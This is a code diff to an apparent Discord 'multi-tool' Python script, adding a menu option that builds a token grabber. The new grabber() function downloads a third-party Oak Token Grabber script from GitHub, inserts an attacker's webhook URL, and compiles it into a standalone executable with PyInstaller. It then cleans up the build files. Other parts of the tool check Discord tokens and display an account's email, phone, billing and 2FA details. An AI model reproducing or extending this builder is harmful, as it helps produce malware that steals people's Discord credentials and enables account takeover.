@@ -1,5 +1,6 @@
 from dhooks import Webhook, Embed
 from pystyle import Colors, Colorate, Center
+import shutil
 import os
 import socket
 import struct
@@ -31,7 +32,8 @@ shit = '''
 [3] Token checker
 [4] Token info
 [5] Webhook checker
-[6] Random ip generator'''
+[6] Random ip generator
+[7] Token Grabber builder'''#oak grabber ofc fr
 def main():
     os.system('cls')
     print(Colorate.Vertical(Colors.blue_to_red,fr+shit))
@@ -118,7 +120,8 @@ def main():
         print(Fore.GREEN+socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff))))
         time.sleep(4)
         main()
-
+    if ye == '7':
+       grabber()
     else:
      print('invaild option please try again')
      time.sleep(3)
@@ -146,7 +149,38 @@ def token():
                 print(f'{Fore.WHITE}[{Fore.LIGHTRED_EX} ERROR {Fore.RESET}]: {Fore.RED} token invaild ')
                 time.sleep(5)
                 main()
-
+def grabber():
+        webhook = input('webhook url >:') #webhook checker by dynasty https://github.com/j0taro/webhook-checker
+        wise = '"Invalid Webhook Token"'
+        haha = '"Unknown Webhook"'
+        try:
+         tree = requests.get(webhook)
+         if wise in tree.text or haha in tree.text or 'discord.com/api/webhooks' not in webhook:
+          os.system('cls')
+          print('invaild webhook fr')
+          input("Press Enter to continue...")
+          main()
+         else:
+          os.system('cls')
+          print('vaild webhook fr')
+        except Exception as e:
+         os.system('cls')
+         print(e)
+         print('invaild webhook')
+         input("Press Enter to continue...")
+         main()
+        oak = requests.get("https://raw.githubusercontent.com/j0taro/Oak-token-Grabber/main/OakGrabber.py").text.replace("webhook_here", webhook)
+        name = input("enter exe name >: ")
+        with open(f"{name}.py", 'w', encoding='utf-8', errors="ignore") as f:
+            f.write(oak)
+        os.system(f'pyinstaller --clean --onefile -i NONE --key OakGrabber -n {name} {name}.py')
+        shutil.rmtree('build')
+        os.remove(f'{name}.spec')
+        os.remove(f'{name}.py')
+        os.system("cls")
+        print('Done check dist folder for ur exe lmao.')
+        input("hit enter lmao")
+        main()
 
 def token2():
     a1 = input('Token >: ')
@@ -286,16 +320,16 @@ def token2():
         print(f"""          {Fore.GREEN}Token: {Fore.RED}{token}""")
 
         print(f"""{Fore.BLUE}Nitro Information:""")
-        print(f"""           {Fore.GREEN}Nitro Status: {Fore.RED}{has_nitro}""")
+        print(f"""          {Fore.GREEN}Nitro Status: {Fore.RED}{has_nitro}""")
 
         if has_nitro:
-            print(f"""           {Fore.GREEN}Expires in: {Fore.RED}{days_left} day(s)""")
+            print(f"""          {Fore.GREEN}Expires in: {Fore.RED}{days_left} day(s)""")
         else:
-            print(f"""           {Fore.GREEN}Expires in: {Fore.RED}None day(s)""")
+            print(f"""          {Fore.GREEN}Expires in: {Fore.RED}None day(s)""")
 
         print(f"""{Fore.BLUE}Contact Information:""")
-        print(f"""           {Fore.GREEN}Phone Number: {Fore.RED}{phone_number if phone_number else ""}""")
-        print(f"""           {Fore.GREEN}Email: {Fore.RED}{email if email else ""}""")
+        print(f"""          {Fore.GREEN}Phone Number: {Fore.RED}{phone_number if phone_number else ""}""")
+        print(f"""          {Fore.GREEN}Email: {Fore.RED}{email if email else ""}""")
 
         if len(billing_info) > 0:
             print(f"""{Fore.BLUE}Billing Information:""")
@@ -322,11 +356,11 @@ def token2():
             print(' ')
 
         print(f"""{Fore.BLUE}Account Security:""")
-        print(f"""           {Fore.GREEN}2FA/MFA Enabled: {Fore.RED}{mfa_enabled}""")
-        print(f"""           {Fore.GREEN}Flags: {Fore.RED}{flags}""")
-        print(f"""           {Fore.GREEN}Other:{Fore.RED}""")
-        print(f"""           {Fore.GREEN}Locale:{Fore.RED} {locale} ({language})""")
-        print(f"""           {Fore.GREEN}Email Verified:{Fore.RED} {verified}""")
+        print(f"""          {Fore.GREEN}2FA/MFA Enabled: {Fore.RED}{mfa_enabled}""")
+        print(f"""          {Fore.GREEN}Flags: {Fore.RED}{flags}""")
+        print(f"""          {Fore.GREEN}Other:{Fore.RED}""")
+        print(f"""          {Fore.GREEN}Locale:{Fore.RED} {locale} ({language})""")
+        print(f"""          {Fore.GREEN}Email Verified:{Fore.RED} {verified}""")
 
     elif res.status_code == 401:
         print(f"""{Fore.LIGHTRED_EX }Invalid token""")
